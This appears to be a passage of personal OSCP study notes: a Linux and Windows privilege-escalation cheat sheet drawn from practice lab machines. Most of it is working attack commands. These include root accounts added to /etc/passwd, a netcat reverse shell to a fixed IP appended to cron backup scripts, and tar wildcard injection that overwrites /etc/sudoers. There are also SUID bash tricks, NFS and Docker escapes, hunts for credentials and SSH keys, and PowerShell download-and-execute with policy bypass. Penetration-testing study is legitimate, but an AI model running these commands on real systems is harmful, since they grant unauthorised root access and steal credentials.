<pre><code>find / -writable -type d 2&gt;/dev/null
</code></pre>
<h3 id="firewall-open-port"><a class="header" href="#firewall-open-port">Firewall open port</a></h3>
<pre><code># centos
firewall-cmd --zone=public --add-port PORT/tcp
# check: ss -tulwn | grep PORT4
</code></pre>
<h3 id="password-loot"><a class="header" href="#password-loot">Password Loot</a></h3>
<pre><code># Locationg SSH Keys
cat /home/&lt;user&gt;/.ssh
find / -name authorized_keys 2&gt; /dev/null
find / -name id_rsa 2&gt; /dev/null
chmod 600 id_rsa

# Finding Passwords # TAKES TIMEEE
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2&gt; /dev/null

# Getting Shadow and passwd file both
unshadow &lt;passwd file&gt; &lt;shadown file&gt; &gt; unshadowed.txt

# If password writing is visible
-&gt; It's pwfeedback attack
</code></pre>
<pre><code># Writable passwd file + cp command
ls -la /etc/shadow
ls -la /etc/passwd # See if you can write into /etc/passwd

# On Kali, 
cp /etc/passwd passwd1

# Append chiya username to passwd1 file and cat /etc/passwd1 to see if its correct.
nano passwd1
chiya:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash

# On Victim Machine, replacing the passwd file.
curl http://&lt;KALI IP&gt;:&lt;PORT&gt;/passwd1 -o /etc/passwd

Now Login using SSH or Simply SU chiya.
</code></pre>
<pre><code>
openssl passwd w00t
echo "root2:msdVLD2vfcrvg:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd
su root2
w00t
id
</code></pre>
<h3 id="restrict-shell-escape"><a class="header" href="#restrict-shell-escape">Restrict Shell Escape</a></h3>
<pre><code>// Rbash

# If your error looks like: -rbash: /usr/bin/python: restricted: cannot specify `/' in command names
BASH_CMDS[a]=/bin/sh;a
</code></pre>
<h3 id="sudo"><a class="header" href="#sudo">Sudo</a></h3>
<pre><code>sudo -l
</code></pre>
<h3 id="docker"><a class="header" href="#docker">Docker</a></h3>
<pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre>
<h3 id="cron-jobs"><a class="header" href="#cron-jobs">Cron Jobs</a></h3>
<h4 id="cron-paths"><a class="header" href="#cron-paths">CRON PATHS</a></h4>
<pre><code>// Type 1 : Crons Paths

cat /etc/crontab # What's running every minute and their path
cat /var/log/cron.log

# Example
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
/tmp/bash -p
whoami
</code></pre>
<h4 id="wildcards"><a class="header" href="#wildcards">WILDCARDS</a></h4>
<pre><code>// Type 2: Cron Wildcards

cat /etc/crontab # What's running every minute and their path
cat /var/log/cron.log
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/shell.sh # Change the path env
chmod +x runme.sh

touch /home/user/--checkpoint=1 # Check for path
touch /home/user/--checkpoint-action=exec=sh\ runme.sh # Check for path
/tmp/bash -p
whoami
</code></pre>
<h4 id="file-overwrites"><a class="header" href="#file-overwrites">FILE OVERWRITES</a></h4>
<pre><code>// Type 3: File Overwrite (Most Common)

cat /etc/crontab
cat /var/log/cron.log

# Example overwrite.sh is weird one with file permission.
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /usr/local/bin/overwrite.sh
/tmp/bash -p
whoami



From Vulnlan Snc box, similiar for priv esc:
Found script running a backup, likely w/root permissions, added this to it:

echo "chmod +s /bin/bash" &gt;&gt; /usr/local/bin/backup.sh

After a minute, run this to get root:

/bin/bash -p


</code></pre>
<h4 id="extra-notes-i-had-on-cron-jobs"><a class="header" href="#extra-notes-i-had-on-cron-jobs">Extra Notes I had on Cron Jobs</a></h4>
<pre><code>
grep "CRON" /var/log/syslog
cat /home/joe/.scripts/user_backups.sh
ls -lah /home/joe/.scripts/user_backups.sh
cd .scripts
echo &gt;&gt; user_backups.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.198 4444 &gt;/tmp/f" &gt;&gt; user_backups.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.198 4444 &gt;/tmp/f" &gt;&gt; this_is_fine.sh 


cat user_backups.sh


</code></pre>
<h3 id="device-drivers"><a class="header" href="#device-drivers">Device Drivers</a></h3>
<pre><code>lsmod 

# Example: libdata
/sbin/modinfo libdata
</code></pre>
<h3 id="unmounted-drives"><a class="header" href="#unmounted-drives">Unmounted Drives</a></h3>
<pre><code>mount
cat /etc/fstab # Swap partition
/bin/lsblk # Available disk
</code></pre>
<h3 id="capabilities"><a class="header" href="#capabilities">Capabilities</a></h3>
<pre><code>getcap -r / 2&gt;/dev/null # ep in end means privilege everything # GTFO Bins.

# Example: cap_setuid+ep
python2.6 -c 'import os; os.setgid(0);os.setuid(0);os.system(/bin/bash)'
</code></pre>
<h3 id="nfs-root-squashing"><a class="header" href="#nfs-root-squashing">NFS Root Squashing</a></h3>
<pre><code>cat /etc/exports 
# Check if rw and "no_root_squash" both are present 
# The directory in which both are present is shareable and mountable.

# On kali
showmount -e &lt;Victim IP&gt;
mkdir /tmp/1
mount -o rw,vers=2 &lt;Victim IP&gt;:/tmp /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' &gt; /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
</code></pre>
<h1 id="dirtyc0w"><a class="header" href="#dirtyc0w">dirtyc0w</a></h1>
<p>https://www.exploit-db.com/exploits/40616</p>
<pre><code>* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
</code></pre>
<pre><code># affects all versions since 2.6.22

# the vulnerability has been patched in kernel versions 4.8.3, 4.7.9, 4.4.26 and newer.
</code></pre>
<ul>
<li>
<ol>
<li></li>
</ol>
<code>/etc/passwd</code> based
<ul>
<li>
<ol>
<li></li>
</ol>
Firefart: <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">FireFart/dirtycow/dirty.c</a>​</li>
<li>
<ol start="2">
<li></li>
</ol>
CPP: <a href="https://github.com/gbonacini/CVE-2016-5195">gbonacini/CVE-2016-5195</a>​</li>
</ul>
</li>
<li>
<ol start="2">
<li></li>
</ol>
<code>SUID-based root</code>
<ul>
<li>
<ol>
<li></li>
</ol>
cowroot.c: <a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">rverton/e9d4ff65d703a9084e85fa9df083c679</a></li>
</ul>
</li>
</ul>
<h4 id="tar-sudo-privesc"><a class="header" href="#tar-sudo-privesc"><a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">TAR Sudo Privesc</a></a></h4>
<pre><code># 1. Create files in the current directory called  
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'  
  
echo "" &gt; '--checkpoint=1'  
echo "" &gt; '--checkpoint-action=exec=sh privesc.sh'  
  
# 2. Create a privesc.sh bash script, that allows for privilege escalation  
#malicous.sh:  
echo 'kali ALL=(root) NOPASSWD: ALL' &gt; /etc/sudoers  
  
#The above injects an entry into the /etc/sudoers file that allows the 'kali'  
#user to use sudo without a password for all commands  
#NOTE: we could have also used a reverse shell, this would work the same!  
#OR: Even more creative, you could've used chmod to changes the permissions  
#on a binary to have SUID permissions, and PE that way
</code></pre>
<h3 id="disk-group-privilege-escalation"><a class="header" href="#disk-group-privilege-escalation"><a href="https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------">Disk group privilege escalation</a></a></h3>
<pre><code> Check the permissions on the current user
- id

 List /dev devices owner and group owner
- ls -l /dev

You can also find the partitions owned by disk group
- find /dev -group disk

Also display the available partitions
- df -h

Exploit:
- debugfs /dev/sda2'


</code></pre>
<h3 id="jadx"><a class="header" href="#jadx"><a href="https://github.com/skylot/jadx">JADX</a></a></h3>
<pre><code>**jadx** - Dex to Java decompiler

This was a hard one I had to use for the PG Educated box. 

If you find a .apk file, you can use jadx-gui to reverse it into java code.

This will likely give you a MainActivity class with methods inside. You can copy this methods into

public class Main { public static void main(String[] args) {
code here...
} }
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p><strong>g0tmilk's Guide to Linux Privilege Escalation as well:</strong><br />
<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br />
</a><br />
<strong>I just got a low-priv shell !</strong><br />
What would S1REN do <em>right now</em>?<br />
<strong>python</strong> -c 'import pty; pty.spawn("/bin/bash")'<br />
OR<br />
<strong>python3</strong> -c 'import pty; pty.spawn("/bin/bash")'<br />
export <strong>PATH</strong>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br />
export <strong>TERM</strong>=xterm-256color<br />
alias <strong>ll</strong>='ls -lsaht --color=auto'<br />
<strong>Ctrl + Z</strong> [Background Process]<br />
stty raw -echo <strong>;</strong> fg <strong>;</strong> reset<br />
stty columns 200 rows 200</p>
<p><strong>S1REN would say:</strong><br />
<em>Various Capabilities?</em><br />
which <strong>gcc</strong><br />
which <strong>cc</strong><br />
which <strong>python</strong><br />
which <strong>perl</strong><br />
which <strong>wget</strong><br />
which <strong>curl</strong><br />
which <strong>fetch</strong><br />
which <strong>nc</strong><br />
which <strong>ncat</strong><br />
which <strong>nc.traditional</strong><br />
which <strong>socat</strong></p>
<p><strong>Compilation? (<strong>Very Back Burner</strong>)</strong><br />
<strong>file</strong> /<strong>bin</strong>/<strong>bash</strong><br />
<strong>uname -a</strong><br />
cat /<strong>etc</strong>/*<strong>-release</strong><br />
cat /<strong>etc</strong>/<strong>issue</strong></p>
<p><strong>What Arch?</strong><br />
file /bin/bash</p>
<p><strong>Kernel?</strong><br />
uname -a</p>
<p><strong>Issue/Release?</strong><br />
cat /etc/issue<br />
cat /etc/***-**release</p>
<p><strong>Are we a <em>real user</em>?</strong><br />
sudo -l<br />
ls -lsaht /etc/sudoers</p>
<p><strong>Are any users a member of exotic groups?</strong><br />
groups <user></p>
<p><strong>Check out your shell's environment variables...</strong><br />
env<br />
<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
<p><strong><em>Users</em>?</strong><br />
cd /home/<br />
ls -lsaht</p>
<p><strong><em>Web Configs</em> containing credentials?</strong><br />
cd /<strong>var</strong>/<strong>www</strong>/<strong>html</strong>/<br />
ls -lsaht</p>
<p><strong><em>SUID</em> Binaries?</strong><br />
find <strong>/</strong> -perm <strong>-u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></p>
<p><strong><em>GUID</em> Binaries?</strong><br />
find <strong>/</strong> -perm <strong>-g=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></p>
<p><strong>SUID/GUID/SUDO <em>Escalation</em>:</strong><br />
<a href="https://gtfobins.github.io/">https://gtfobins.github.io/<br />
</a></p>
<p><strong>Binary/Languages with "<em>Effective Permitted</em>" or "<em>Empty Capability</em>" (<strong>ep</strong>):</strong><br />
<a href="https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities">https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities<br />
</a>Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.<br />
getcap -r / 2&gt;/dev/null</p>
<p><strong>We need to start monitoring the system if possible while performing our enumeration...</strong><br />
<strong>In other words:</strong><br />
"S1REN... <em>Is privilege escalation going to come from some I/O file operations being done by some script on the system?</em>"<br />
<a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">https://github.com/DominicBreuker/pspy/blob/master/README.md<br />
</a>cd /var/tmp/<br />
File Transfer <strong>--&gt;</strong> pspy32<br />
File Transfer <strong>--&gt;</strong> pspy64<br />
chmod 755 pspy32 pspy64<br />
./pspy&lt;32/64&gt;</p>
<p><strong>What does the local network look like?</strong><br />
netstat -antup<br />
netstat -tunlp</p>
<p><strong>Is anything vulnerable running as root?</strong><br />
ps aux |grep -i 'root' --color=auto</p>
<p><strong>MYSQL Credentials? Root Unauthorized Access?</strong><br />
mysql -uroot -p<br />
Enter Password:<br />
root : root<br />
root : toor<br />
root :</p>
<p><strong>S1REN would take a quick look at etc to see if any user-level people did special things:</strong><br />
cd /<strong>etc</strong>/<br />
ls -lsaht<br />
<em>Anything other than root here?</em><br />
• Any config files left behind?<br />
→ ls -lsaht |grep -i ‘.conf’ --color=auto</p>
<p><strong>• If we have root priv information disclosure - are there any .secret in /etc/ files?</strong><br />
→ ls -lsaht |grep -i ‘.secret’ --color=aut</p>
<p><strong>SSH Keys I can use perhaps for even further compromise?</strong><br />
ls -lsaR /<strong>home</strong>/</p>
<p><strong>Quick look in:</strong><br />
ls -lsaht /<strong>var</strong>/<strong>lib</strong>/<br />
ls -lsaht /<strong>var</strong>/<strong>db</strong>/</p>
<p><strong>Quick look in:</strong><br />
ls -lsaht /<strong>opt</strong>/<br />
ls -lsaht /<strong>tmp</strong>/<br />
ls -lsaht /<strong>var</strong>/<strong>tmp</strong>/<br />
ls -lsaht /<strong>dev</strong>/<strong>shm</strong>/</p>
<p><strong>File Transfer Capability? What can I use to transfer files?</strong><br />
which wget<br />
which curl<br />
which nc<br />
which fetch (BSD)<br />
ls -lsaht /bin/ |grep -i 'ftp' --color=auto</p>
<p><strong>NFS? Can we exploit weak NFS Permissions?</strong><br />
cat /<strong>etc</strong>/<strong>exports</strong><br />
no_root_squash?<br />
<a href="https://recipeforroot.com/attacking-nfs-shares/">https://recipeforroot.com/<strong>attacking-nfs-shares</strong>/<br />
</a><br />
<strong>[On Attacking Machine]</strong><br />
mkdir -p /<strong>mnt</strong>/<strong>nfs</strong>/<br />
mount <strong>-t</strong> nfs <strong>-o</strong> <strong>vers</strong>=&lt;version 1,2,3&gt; <strong>$IP:</strong><NFS Share> /<strong>mnt</strong>/<strong>nfs</strong>/ <strong>-nolock</strong><br />
gcc suid.c <strong>-o</strong> suid<br />
cp suid /<strong>mnt</strong>/<strong>nfs</strong>/<br />
chmod u+s /<strong>mnt</strong>/<strong>nfs</strong>/<strong>suid</strong><br />
su &lt;user id matching target machine's user-level privilege.&gt;</p>
<p><strong>[On Target Machine]</strong><br />
user@host$ ./suid<br />
<strong>#</strong></p>
<p><strong><em>Where can I live on this machine?</em> Where can I read, write and execute files?</strong><br />
/<strong>var</strong>/<strong>tmp</strong>/<br />
/<strong>tmp</strong>/<br />
/<strong>dev</strong>/<strong>shm</strong>/</p>
<p><strong>Any exotic file system mounts/extended attributes?</strong><br />
cat /<strong>etc</strong>/<strong>fstab</strong></p>
<p><strong>Forwarding out a weak service for root priv (with meterpreter!):</strong><br />
Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.<br />
<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p>
<p><strong>Forwarding out netbios-ssn EXAMPLE:</strong><br />
<strong>meterpreter&gt;</strong> portfwd add –l 139 –p 139 –r [target remote host]<br />
<strong>meterpreter&gt;</strong> background<br />
use exploit/linux/samba/trans2open<br />
set RHOSTS 0.0.0.0<br />
set RPORT 139<br />
run</p>
<p><strong>Can we write as a low-privileged user to /etc/passwd?</strong><br />
openssl passwd -1<br />
i&lt;3hacking<br />
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.<br />
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' &gt;&gt; /etc/passwd<br />
su siren<br />
id</p>
<p><strong>Cron.</strong><br />
crontab –u root –l</p>
<p><strong>Look for unusual system-wide cron jobs:</strong><br />
cat /etc/<strong>crontab</strong><br />
ls /etc/<strong>cron.</strong>*</p>
<p><strong>Bob is a user on this machine. What is every single file he has ever created?</strong><br />
find / -user <strong>miguel</strong> 2&gt;/dev/null</p>
<p><strong>Any mail?</strong> <strong>mbox in User $HOME directory?</strong><br />
cd /<strong>var</strong>/<strong>mail</strong>/<br />
ls -lsaht</p>
<p><strong>Linpease</strong>:<br />
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br />
</a><br />
<strong>Traitor:</strong><br />
<a href="https://github.com/liamg/traitor">https://github.com</a><a href="https://github.com/liamg/traitor">/</a><a href="https://github.com/liamg/traitor">liamg/traitor<br />
</a><br />
<strong>GTFOBins:</strong><br />
<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><strong>PSpy32/Pspy64:</strong><br />
<a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">https://github.com/DominicBreuker/pspy/blob/master/README.md</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-enumeration"><a class="header" href="#windows-enumeration">Windows Enumeration</a></h2>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a></li>
<li><a href="https://www.kali.org/tools/windows-privesc-check/">Windows Privesc Checker</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a></li>
</ul>
<h3 id="search"><a class="header" href="#search">Search</a></h3>
<pre><code>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction
SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -
ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include
*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue


</code></pre>
<h3 id="path-fix-1"><a class="header" href="#path-fix-1">Path fix</a></h3>
<pre><code>set PATH=C:\Windows;C:\Windows\system32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%

or 

set PATH=%SystemRoot%\system32;%SystemRoot%;

Get-ExecutionPolicy -List
Set-ExecutionPolicy Unrestricted
</code></pre>
<h3 id="powershell-location"><a class="header" href="#powershell-location">Powershell location</a></h3>
<pre><code>C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
</code></pre>
<h3 id="writable-paths-1"><a class="header" href="#writable-paths-1">Writable Paths</a></h3>
<pre><code>C:\Windows\Temp

C:\Users\&lt;USER&gt;\Desktop\

C:\Users\Public\

C:\Documents and Settings\Public\

C:\Documents and Settings\&lt;USER&gt;\Desktop\
</code></pre>
<h3 id="ps-styles"><a class="header" href="#ps-styles">PS styles</a></h3>
<pre><code>PS&gt; $host

&gt; powershell -c &lt;cmd&gt;

&gt; powershell.exe -exec bypass -Command &lt;&gt;

</code></pre>
<h3 id="cmds"><a class="header" href="#cmds">Cmds</a></h3>
<pre><code># download file

certutil.exe -urlcache [-split] -f &lt;source&gt; &lt;destination&gt;

PS&gt; wget &lt;source&gt; -OutFile &lt;dest&gt;

PS&gt; Invoke-WebRequest -Uri &lt;source&gt; -Outfile &lt;out-path&gt;

powershell -c (New-Object System.Net.WebClient).downloadFile('&lt;source&gt;', '&lt;dest&gt;')

powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')

wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309

#run file

&gt; ren &lt;src&gt; &lt;dest&gt;

PS&gt; Start-Process &lt;file.exe&gt;

# rename

PS&gt; Rename-Item -Path &lt;file&gt; -NewName &lt;new-file&gt;

# move

&gt; copy /Y &lt;src&gt; &lt;dest&gt;

PS&gt; Move-Item -Path &lt;src&gt; -Destination &lt;dest&gt;

# /E copies entire dir-structure

&gt; robocopy &lt;src&gt; &lt;dest&gt; /E

# delete

PS&gt; Remove-Item -Path &lt;file&gt; [-recursive]

</code></pre>
<h3 id="ps-shorthand"><a class="header" href="#ps-shorthand">PS shorthand</a></h3>
<pre><code># get child items

PS&gt; gci [--recurse]

# get content

PS&gt; gc FILE
</code></pre>
<h3 id="arch-based-windows-directory-structure"><a class="header" href="#arch-based-windows-directory-structure">Arch based windows directory structure</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Session type</th><th>32 bit folder</th><th>64 bit folder</th></tr></thead><tbody>
<tr><td>32 bit session</td><td>C:\Windows\system32</td><td>C:\Windows\sysNative\</td></tr>
<tr><td>64 bit session</td><td>C:\Windows\sysWOW64</td><td>C:\Windows\system32\</td></tr>
</tbody></table>
</div>
<h3 id="manual"><a class="header" href="#manual">Manual</a></h3>
<pre><code>
whoami # username/hostname
whoami /groups # check user is in which group

net user
net user &lt;username&gt;
Get-LocalUser # Powershell

net localgroup
net localgroup &lt;groupname&gt;
Get-localgroup # Powershell

systeminfo
netstat -ano

# Installed Apps # Powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process # Powershell - running process
Get-Process | Select ProcessName,Path # With Path

# Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Default xampp passwords
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini

# Change username
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-History # Powershell History
(Get-PSReadlineOption).HistorySavePath # Powershell History

</code></pre>
<h3 id="automate"><a class="header" href="#automate">Automate</a></h3>
<pre><code>
winPEASx86.exe or winPEASx64.exe are best

Then

windows-privesc-check2.exe

Otherwise,

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"

or

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'





</code></pre>
<h3 id="more-automate"><a class="header" href="#more-automate">More Automate</a></h3>
<h3 id="powerup"><a class="header" href="#powerup">PowerUp</a></h3>
<ol>
<li>
<p><strong>Download and Import the Script:</strong></p>
<ul>
<li>
<p>First, you need to download the <code>PowerUp.ps1</code> script from the PowerSploit repository. You can do this by cloning the PowerSploit repository from GitHub or by downloading the script directly.</p>
</li>
<li>
<p>Once you have the script, you can import it into your PowerShell session using the <code>Import-Module</code> cmdlet.</p>
<p><code>Import-Module ./Path/To/PowerUp.ps1</code></p>
</li>
</ul>
</li>
<li>
<p><strong>Run Functions to Find Vulnerabilities:</strong></p>
<ul>
<li>
<p><code>PowerUp.ps1</code> offers a variety of functions to check for common misconfigurations that can lead to privilege escalation. For example:</p>
<ul>
<li>
<p><strong>Invoke-AllChecks:</strong> This function runs all current escalation checks and returns a consolidated object with the results.</p>
<p><code>Invoke-AllChecks</code></p>
</li>
<li>
<p><strong>Get-ServiceUnquoted:</strong> This function checks for services with unquoted paths that also have a space in their path. This can potentially lead to privilege escalation.</p>
<p><code>Get-ServiceUnquoted</code></p>
</li>
<li>
<p><strong>Write-UserAddMSI:</strong> This function generates an MSI file in the specified path that prompts for installation. When installed, it adds a local or domain user with the specified username and password.</p>
<p><code>Write-UserAddMSI -UserName "NewAdminUser" -Password "P@ssword!"</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Write-ServiceBinary</strong>: This function writes out a binary that adds a local admin user or executes a custom command when a service with an unquoted path (and a writable space in the path) is started.</p>
<p><code>Write-ServiceBinary -Name 'VulnerableServiceName' -Path 'C:\Path\To\Output\Binary.exe'</code></p>
</li>
<li>
<p><strong>Invoke-ServiceAbuse</strong>: This function abuses writable service binaries to write out a payload that adds a local admin user.</p>
<p><code>Invoke-ServiceAbuse -Name 'VulnerableServiceName' -UserName 'NewAdminUser'</code></p>
</li>
<li>
<p><strong>Get-ModifiablePath</strong>: This function finds paths that are modifiable by the current user and are in the system's PATH environment variable. This can be exploited if a service or application executes a binary from a directory that the user can write to.</p>
<p><code>Get-ModifiablePath</code></p>
</li>
</ol>
<h3 id="reverse-engineering-files"><a class="header" href="#reverse-engineering-files">Reverse Engineering Files</a></h3>
<pre><code>You can use Ghidra or dnSpy
https://github.com/dnSpy/dnSpy

## Get File info
file UserInfo.exe


## Load dnSpy on Win box
</code></pre>
<p><img src="OSCP/OSCP-Notes/src/dnSpy.png" alt="dnSpy" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-privesc-exploitation"><a class="header" href="#windows-privesc-exploitation">Windows PrivEsc Exploitation</a></h2>
<h3 id="links-14"><a class="header" href="#links-14">Links</a></h3>
<ul>
<li><a href="https://steflan-security.com/windows-privilege-escalation-runas-stored-credentials/">Run As Blog</a></li>
<li><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a></li>
<li><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a></li>
<li><a href="https://juggernaut-sec.com/unquoted-service-paths/">Unquoted Service Path</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl">Payload All The Things Win Priv</a></li>
<li><a href="https://4pfsec.com/offensive-windows-fodhelper-exe/">UAC Bypass Info</a></li>
<li><a href="https://wadcoms.github.io/#">WADComs</a></li>
<li><a href="https://lolbas-project.github.io/">LOLBAS</a></li>
</ul>
<h3 id="turn-off-powershell-script-restrictions"><a class="header" href="#turn-off-powershell-script-restrictions">Turn off Powershell Script Restrictions</a></h3>
<pre><code>Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
</code></pre>
<h3 id="quick-wins-1"><a class="header" href="#quick-wins-1">Quick Wins</a></h3>
<pre><code>whoami /priv # Printspoofer
whoami /groups # UAC Bypass
findstr /si password *.txt *.ini *.config # passwords # BREAKS THE SHELL A LOT # AVOID
# Powershell history passwords
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Is value 1? If yes, AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

icacls "test.exe" # Insecure file permission
Get-Acl C:\xampp\htdocs\logs | fl # Same as icacls but better
wsl whoami # Windows subsystem
cmdkey /list # Stored creds so do Runas
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Autologon creds

# unquoted
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
wmic service list brief | findstr  "Running" # Scheduled tasks
netstat -ano # Chisel?

# Low-level findings
Look in temp, Look in system 32 for SAM and SYSTEM, Look for ssh keys
Look at PowerShell history and appcmd.exe on winpeas
</code></pre>
<h3 id="accesschkexe"><a class="header" href="#accesschkexe">Accesschk.exe</a></h3>
<pre><code>&gt; accesschk.exe /accepteula -flag [FLAG]
# -u: suppress errors | -q: quiet; no banner | -v: verbose

# -w: write access objects only
# -c: windows service &lt;&gt;
# -d: directory &lt;&gt;
# -k: registry key &lt;&gt;
</code></pre>
<h3 id="icacls"><a class="header" href="#icacls">icacls</a></h3>
<pre><code>&gt; icacls [FILE|DIR] [FLAG]
# /T - traverse all dir and files within the folder
# /grant USER:PERM
# /setowner USER

</code></pre>
<h3 id="service-cmds"><a class="header" href="#service-cmds">Service Cmds</a></h3>
<pre><code># configuration of service
&gt; sc.exe qc SERVICE

# status of service
&gt; sc.exe query SERVICE

# modify config
&gt; sc.exe config SERVICE &lt;key&gt;= &lt;value&gt;

# start / stop / restart
&gt; net [start/stop] SERVICE
&gt; sc [start/stop] SERVICE
PS&gt; Restart-Service -Name SERVICE

# is exe running with admin?
&gt; tasklist /V | findstr FILE.exe
</code></pre>
<h3 id="password-loot-1"><a class="header" href="#password-loot-1">Password Loot</a></h3>
<pre><code>findstr /si password *.txt *.ini *.config # Password in text files
cmdkey /list
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt # password

# All 3 are golden Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\&lt;steve&gt;\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

WE CAN ALWAYS SWITCH TO OTHER USER WITH RUNAS COMMAND like and put the password that we found
runas /user:backupadmin cmd # backupadmin is the user here
runas /savecred /user:admin cmd # We can try getting reverse shell install cmd

# Password in registry keys
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Look for desktop.ini on desktop of all users, you may find password sometimes CTFish
Look for unattended.xml files
Look at PowerShell history and appcmd.exe on winpeas
</code></pre>
